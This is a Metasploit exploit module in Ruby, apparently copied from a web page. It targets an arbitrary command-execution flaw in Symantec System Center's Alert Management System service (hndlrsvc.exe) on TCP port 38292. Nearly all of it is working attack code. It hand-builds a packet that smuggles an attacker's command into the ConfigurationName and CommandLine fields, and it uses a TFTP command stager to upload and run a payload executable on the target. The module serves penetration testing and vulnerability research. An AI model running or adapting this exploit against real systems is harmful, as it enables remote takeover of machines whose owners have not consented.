# $Id: ams_hndlrsvc.rb 13591 2011-08-19 18:35:29Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = ExcellentRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Symantec System Center Alert Management System (hndlrsvc.exe) Arbitrary Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    Symantec System Center Alert Management System is prone to a
                remote command-injection vulnerability because the application fails
                to properly sanitize user-supplied input.
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13591 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;66807&#039;],
                    [ &#039;BID&#039;, &#039;41959&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.foofus.net/~spider/code/AMS2_072610.txt&#039; ],
                ],
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        }
                    ]
                ],
            &#039;Privileged&#039; => &#039;true&#039;,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Jul 26 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(38292),
                OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, ""]),
            ], self.class)
    end
 
    def windows_stager
 
        exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
 
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        execute_cmdstager({ :temp => &#039;.&#039;})
        @payload_exe = payload_exe
 
        print_status("Attempting to execute the payload...")
        execute_command(@payload_exe)
 
    end
 
    def execute_command(cmd, opts = {})
     
        connect
 
        if ( cmd.length > 128 )
            raise RuntimeError,"Command strings greater then 128 characters will not be processed!"
        end
 
        string_uno  = Rex::Text.rand_text_alpha_upper(11)
        string_dos  = Rex::Text.rand_text_alpha_upper(rand(4) + 5)
 
        packet =  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00"
        packet << "\x02\x00\x95\x94\xc0\xa8\x02\x64\x00\x00\x00\x00\x00\x00\x00\x00"
        packet << "\xe8\x03\x00\x00"
        packet << &#039;PRGXCNFG&#039;
        packet << "\x10\x00\x00\x00"
        packet << "\x00\x00\x00\x00\x04"
        packet << &#039;ALHD\F&#039;
        packet << "\x00\x00\x01\x00\x00"
        packet << "\x00\x01\x00\x0e\x00"
        packet << &#039;Risk Repaired&#039;
        packet << "\x00\x25\x00"
        packet << &#039;Symantec Antivirus Corporate Edition&#039;
        packet << "\x00\xf9\x1d\x13\x4a\x3f"
        packet << [string_uno.length + 1].pack(&#039;v&#039;) + string_uno
        packet << "\x00\x08\x08\x0a"
        packet << "\x00" + &#039;Risk Name&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x0a\x00"
        packet << &#039;File Path&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x11\x00"
        packet << &#039;Requested Action&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x0e\x00"
        packet << &#039;Actual Action&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x07\x00"
        packet << &#039;Logger&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x05\x00"
        packet << &#039;User&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x08\x09\x00"
        packet << &#039;Hostname&#039;
        packet << "\x00\x0e\x00" + [string_uno.length + 1].pack(&#039;v&#039;) + string_uno
        packet << "\x00\x08\x13\x00"
        packet << &#039;Corrective Actions&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00\x00\x07\x08\x12\x00"
        packet << &#039;ConfigurationName&#039;
        packet << [cmd.length + 3].pack(&#039;n&#039;) + [cmd.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + cmd
        packet << "\x00\x08\x0c\x00"
        packet << &#039;CommandLine&#039;
        packet << [cmd.length + 3].pack(&#039;n&#039;) + [cmd.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + cmd
        packet << "\x00\x08\x08\x00"
        packet << &#039;RunArgs&#039;
        packet << "\x00\x04\x00\x02\x00"
        packet << "\x20\x00\x03\x05\x00"
        packet << &#039;Mode&#039;
        packet << "\x00\x04\x00\x02\x00\x00\x00"
        packet << "\x0a\x0d\x00"
        packet << &#039;FormatString&#039;
        packet << "\x00\x02\x00\x00\x00\x08\x12\x00"
        packet << &#039;ConfigurationName&#039;
        packet << "\x00\x02\x00\x00\x00\x08\x0c\x00"
        packet << &#039;HandlerHost&#039;
        packet << [string_dos.length + 3].pack(&#039;n&#039;) + [string_dos.length + 1].pack(&#039;n&#039;)
        packet << "\x00" + string_dos
        packet << "\x00" * packet.length
 
        sock.put(packet)
     
        select(nil,nil,nil,3)  
        disconnect
    end
 
    def exploit
 
        if not datastore[&#039;CMD&#039;].empty?
            print_status("Executing command &#039;#{datastore[&#039;CMD&#039;]}&#039;")
            execute_command(datastore[&#039;CMD&#039;])
            return
        end
 
        case target[&#039;Platform&#039;]
            when &#039;win&#039;
                windows_stager
            else
                raise RuntimeError, &#039;Target not supported.&#039;
            end
 
        handler
 
    end
end



